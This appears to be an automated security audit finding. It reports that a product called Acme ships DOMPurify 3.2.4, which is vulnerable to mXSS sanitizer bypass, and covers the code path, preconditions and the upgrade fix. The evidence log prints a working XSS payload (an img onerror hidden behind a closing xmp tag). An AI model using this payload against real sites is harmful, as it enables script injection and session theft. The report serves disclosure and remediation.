# [H2] Dompurify Outdated Mxss

## Summary

Acme installs DOMPurify `^3.2.4` (resolved exactly to 3.2.4 in the lockfile). This version is
unpatched against 7 active advisories requiring upgrade to 3.3.2 or 3.4.0. When Acme is deployed
with `sanitize: true` (or `untrustedSpec: true`), all Markdown rendered from spec content passes
through DOMPurify before `dangerouslySetInnerHTML`. Each of these bypasses allows XSS despite
DOMPurify being active.

## Severity, Confidence, Vulnerability Type

- **Severity**: High
- **Confidence**: Confirmed (PoC executed)
- **Vulnerability Type**: XSS
- **Triage-Priority**: P1

## Impact

- **Scope**: Any deployment using `sanitize: true` against untrusted specs
- **Effect**: Full DOM XSS in embedding origin; session hijack, cookie theft, DOM manipulation
- **Default state**: `sanitize` defaults to `false`, meaning most deployments are vulnerable to
  simpler raw-HTML XSS (p5-001 class) but not specifically to the DOMPurify bypass. However,
  the intended secure mode (`sanitize: true`) is itself vulnerable via the above CVEs.

## Affected Component

- **File**: `[REDACTED].tsx:16`
- **Source**: spec description fields rendered through marked → dompurify.sanitize(html) with no config
- **Sink**: [REDACTED].tsx:31 (dangerouslySetInnerHTML after bare-config DOMPurify pass)
- **Chamber**: chamber-01

## Source to Sink Flow

Primary site: `[REDACTED].tsx:16`. See draft.md for the full trace.

## Vulnerable Code

- `package-lock.json` line 7746: `"dompurify": { "version": "3.2.4" }`
- `[REDACTED].tsx:10`: `const dompurify = DOMPurify['default'] as DOMPurify.DOMPurify;`
- `[REDACTED].tsx:16`: `const sanitize = (sanitize, html) => (sanitize ? dompurify.sanitize(html) : html);`
- DOMPurify is invoked with **default configuration** — no custom `ALLOWED_TAGS`, `ALLOWED_ATTR`, or `ADD_TAGS` overrides in Acme itself. Advisory bypass techniques that rely on non-default DOMPurify config (GHSA-39q2-94rc-95cp, GHSA-h7mw-gpvr-xq4m, GHSA-crv5-9vww-q3g8) require the config options be set, which Acme does not set — those three may be less exploitable in Acme's default usage.
- Advisories GHSA-cj63-jhhr-wcxv (USE_PROFILES pollution), GHSA-h8r8-wccr-v5f2 (mXSS re-contextualization), and GHSA-v9jr-rg53-9pgp (CUSTOM_ELEMENT_HANDLING PP-to-XSS) do not require special config and affect default DOMPurify usage.

## Proof of concept & Evidence

**PoC-Status**: executed

Evidence files under `evidence/`:
- `evidence/env-info.txt`
- `evidence/exploit.log`
- `evidence/exploit.sh`
- `evidence/impact.log`
- `evidence/poc.js`
- `evidence/setup.sh`

Decisive output from `evidence/exploit.log`:
```
[*] DOMPurify version under test: 3.2.4

[*] Malicious spec description HTML fed to dompurify.sanitize():
    <img src=x alt="</xmp><img src=x onerror=alert('XSS-via-DOMPurify-3.2.4')">

[*] dompurify.sanitize() output (what Acme writes to dangerouslySetInnerHTML):
    <img alt="</xmp><img src=x onerror=alert('XSS-via-DOMPurify-3.2.4')" src="x">

[*] Bypass indicators in sanitized string:
    </xmp> preserved in output  : true
    onerror preserved in output  : true

[*] Re-contextualization test (sanitized output re-parsed inside <xmp>):
    innerHTML set to: <xmp><img alt="</xmp><img src=x onerror=alert('XSS-via-DOMPurify-3.2.4')" src="x"></xmp>
    img[onerror] elements in resulting DOM: 1
    onerror handler value: alert('XSS-via-DOMPurify-3.2.4')"

[*] Patch verification (DOMPurify 3.3.2): skipped-single-version-install
    Known result (from separate test run): 3.3.2 sanitizes to <img src="x">
    Known result (from separate test run): onerror=false, </xmp>=false

[*] Acme code evidence:
    package-lock.json: "dompurify": { "version": "3.2.4" }
    package.json:       "dompurify": "^3.2.4"
    SanitizedMdBlock.tsx:10  const dompurify = DOMPurify['default'] as DOMPurify.DOMPurify
    SanitizedMdBlock.tsx:16  const sanitize = (s, html) => s ? dompurify.sanitize(html) : html
    SanitizedMdBlock.tsx:31  dangerouslySetInnerHTML={{ __html: sanitize(options.sanitize, rest.html) }}
{"status":"confirmed","evidence":"img[onerror] element created in re-parsed DOM after DOMPurify 3.2.4 sanitization; onerror=\"alert('XSS-via-DOMPurify-3.2.4')\"\"","notes":"DOMPurify 3.2.4 (Acme package-lock.json locked version) preserves onerror handler in sanitized output when mXSS re-contextualization payload is used. Fixed in 3.3.2 (separate test confirmed). Exploit requires sanitize:true deployment AND a raw-text re-contextualization step. Without re-contextualization the onerror is still in the sanitized string but only fires if re-parsed inside xmp/noscript/script wrappers. String-level bypass (onerror in output) is confirmed at DOMPurify API level without re-contextualization."}

```

## Preconditions

- **Auth-Required**: no
- **Auth-Roles**: anonymous
- **Protocol**: local
- **Attack vector**: Remote (network); attacker must control or influence the OpenAPI spec rendered by Acme.

## Remediation

Upgrade DOMPurify to `>=3.4.0`. Current `package.json` specifies `"dompurify": "^3.2.4"` — bump
the constraint to `"^3.4.0"` and run `npm install`.

Confirm-Status: confirmed-test
Confirm-Method: generated-test
Confirm-Test: archon/findings/H2-dompurify-outdated-mxss/confirm-test.ts
Confirm-Test-Output: archon/findings/H2-dompurify-outdated-mxss/confirm-test-output.log
Confirm-Test-Identity: none
Confirm-Timestamp: 2026-05-19T04:10:27Z
Confirm-Notes: Generated Jest test in local mode confirmed the mXSS condition using DOMPurify 3.2.4 directly under jsdom, then reparsed the sanitized string inside an xmp wrapper to show an img[onerror] node is created. The test also verified the exact Acme sink in [REDACTED].tsx uses dompurify.sanitize(html) and dangerouslySetInnerHTML with no hardening options. Existing repository tests cover Markdown rendering happy paths and an unrelated href XSS case, but no existing test exercised SanitizedMdBlock with attacker-controlled mXSS payloads.
